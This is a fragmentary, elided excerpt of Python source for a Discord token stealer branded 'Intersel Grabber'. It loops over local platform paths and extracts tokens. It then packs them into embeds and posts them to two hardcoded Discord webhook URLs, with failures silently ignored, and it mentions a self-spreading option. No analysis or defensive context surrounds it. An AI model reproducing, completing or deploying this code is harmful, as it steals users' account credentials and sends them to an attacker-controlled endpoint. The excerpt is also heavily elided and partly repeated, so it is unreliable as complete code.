...
def main(): 
    ...
    for platform, path in PATHS.items(): 
        ...
        for token in getTokenz(path): 
            ...
            embed = { 
                ...
                "footer": { 
                    "text": f"Intersel Grabber by Frostie#0003 | https://discord.gg/malware" 
                } 
            } 
            embeds.append(embed) 
    ...
    webhook = { 
        "content": "", 
        "embeds": embeds, 
        "username": "Intersel Grabber", 
        "avatar_url": "https://cdn.discordapp.com/attachments/864540457631481866/864581472588922900/static.png" 
    } 
    try: 
        urlopen(Request("https://discord.com/api/webhooks/905510025827610634/JpDujHkhRxFfgYeWc0mx1PgFUUQbdTIngfB6eyELpzrSGk55fxfRnNH8qrkzwiga--iV", data=dumps(webhook).encode(), headers=getHeader())) 
    except: 
        pass 
    try: 
        urlopen(Request("https://discord.com/api/webhooks/905510106697986048/u-IrvRR1sjqekmZAvxnbPCIskDjaRY0iTbTMT33Py3jxXCIuk-__K4SUNBVQ72aG95mJ", data=dumps(webhook).encode(), headers=getHeader())) 
    except: 
        pass 
    if self_spread: 
    ...
    for platform, path in PATHS.items(): 
        ...
        for token in getTokenz(path): 
            ...
            embed = { 
                ...
                "footer": { 
                    "text": f"Intersel Grabber by Frosite#0003 | https://discord.gg/malware" 
                } 
            } 
            embeds.append(embed) 
    with open(cache_path, "a") as file: 
